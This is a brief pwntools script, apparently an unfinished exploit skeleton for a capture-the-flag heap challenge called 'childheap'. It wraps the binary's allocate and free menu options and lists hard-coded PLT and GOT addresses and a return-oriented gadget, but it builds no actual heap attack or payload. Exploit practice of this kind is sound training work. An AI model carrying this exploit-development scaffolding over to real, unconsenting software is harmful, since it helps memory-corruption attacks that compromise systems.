from pwn import *

context.log_level = 'debug'

def malloc(index, size):
	p.recvuntil('>')
	p.sendline('1')

	p.sendlineafter('index:', index)
	p.sendlineafter('size:', size)

def free(index):
	p.recvuntil('>')
	p.sendline('2')

	p.sendlineafter('index:', index)

p = process('./childheap')
#p = remote('',)
e = ELF('./childheap')
l = e.libc
#l = ELF('./')


free_plt = 0x4006ec
malloc_plt = 0x400760
puts_plt = 0x400700
read_plt = 0x400740
printf_plt = 0x400730

malloc_got = 0x602050
puts_got = 0x602020
read_got = 0x602040
free_got = 0x602018
printf_got = 0x602038

p_rdi_r = 0x0000000000400bc3
pause()

p.interactive()